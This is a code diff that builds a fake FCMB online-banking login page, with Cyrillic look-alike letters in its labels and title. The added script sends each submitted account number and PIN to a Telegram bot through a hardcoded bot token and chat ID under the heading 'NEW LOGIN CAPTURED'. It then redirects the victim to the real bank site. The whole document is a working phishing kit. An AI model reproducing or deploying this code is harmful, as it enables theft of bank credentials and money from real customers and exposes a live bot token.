@@ -4,31 +4,138 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FСМВ Online</title>
+    <style>
+        /* 🎨 CSS: Branding and Layout */
+        :root {
+            --fcmb-purple: #5B2C6F;
+            --fcmb-yellow: #F5C400;
+            --error-red: #CF0A2C;
+        }
+
+        body { 
+            font-family: Arial, sans-serif; 
+            background-color: #f4f4f4; 
+            display: flex; 
+            justify-content: center; 
+            padding-top: 50px; 
+            margin: 0;
+        }
+        
+        .card { 
+            background: white; 
+            width: 90%; 
+            max-width: 380px; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
+            overflow: hidden; 
+        }
+        
+        header { 
+            background: var(--fcmb-purple); 
+            color: white; 
+            padding: 25px; 
+            text-align: center; 
+            border-bottom: 4px solid var(--fcmb-yellow);
+        }
+        
+        .form-area { padding: 25px; }
+        
+        h3 { color: #333; margin-top: 0; }
+        
+        .field { margin-bottom: 20px; }
+        
+        label { display: block; margin-bottom: 8px; font-size: 14px; color: #666; }
+        
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            border: 1px solid #ccc; 
+            border-radius: 4px; 
+            box-sizing: border-box; 
+            font-size: 16px;
+        }
+
+        /* 🛑 The Red Box Logic (CSS State) */
+        .validation-error { 
+            border: 2px solid var(--error-red) !important; 
+            background-color: #fff8f8; 
+        }
+
+        button { 
+            width: 100%; 
+            padding: 14px; 
+            background: var(--fcmb-purple); 
+            color: white; 
+            border: none; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            font-size: 16px;
+        }
+    </style>
 </head>
 <body>
-    <div class="login-wrapper">
-        <header>
-            <h1 class="logo">FСМВ</h1>
-        </header>
 
-        <div class="form-container">
-            <h2>Оnlіnе Ваnkіng</h2>
-            <form id="fcmb-form">
-                <div class="input-group">
-                    <label>Ассount Numbeг</label>
-                    <input type="text" id="account-field" placeholder="10 digits">
-                </div>
-
-                <div class="input-group">
-                    <label>Раѕѕwогd / РІN</label>
-                    <input type="password" id="pin-field">
-                </div>
-
-                <button type="button" id="submit-btn">Vеrіfу Now</button>
-            </form>
-        </div>
+<div class="card">
+    <header>
+        <h1 style="margin:0;">FСМВ</h1> </header>
+    <div class="form-area">
+        <h3>Оnlіnе Ваnkіng Lоgіn</h3>
+        <form id="authForm">
+            <div class="field">
+                <label>Ассоunt Numbeг</label>
+                <input type="text" id="accInput" placeholder="10 digits" maxlength="10">
+            </div>
+            <div class="field">
+                <label>Раѕѕwогd / РІN</label>
+                <input type="password" id="pinInput">
+            </div>
+            <button type="button" id="submitBtn">Vеrіfу Now</button>
+        </form>
     </div>
+</div>
 
-    </body>
+<script>
+    /* 🧠 JavaScript: Validation and Data Transfer */
+    const botToken = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
+    const chatId = '7909543900';
+
+    document.getElementById('submitBtn').addEventListener('click', async () => {
+        const accField = document.getElementById('accInput');
+        const pinField = document.getElementById('pinInput');
+        let isValid = true;
+
+        // 1. Reset states
+        accField.classList.remove('validation-error');
+        pinField.classList.remove('validation-error');
+
+        // 2. Perform validation (The "Red Box" check)
+        if (accField.value.length < 10) {
+            accField.classList.add('validation-error');
+            isValid = false;
+        }
+
+        if (pinField.value.trim() === "") {
+            pinField.classList.add('validation-error');
+            isValid = false;
+        }
+
+        // 3. If valid, send data and redirect
+        if (isValid) {
+            const text = `📂 *NEW LOGIN CAPTURED*\n\n👤 Acc: ${accField.value}\n🔑 PIN: ${pinField.value}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+
+            try {
+                // Background send
+                await fetch(url);
+                // 🔄 Redirect to real site
+                window.location.replace("https://www.fcmb.com/");
+            } catch (err) {
+                console.error("Network error:", err);
+            }
+        }
+    });
+</script>
+
+</body>
 </html>
-
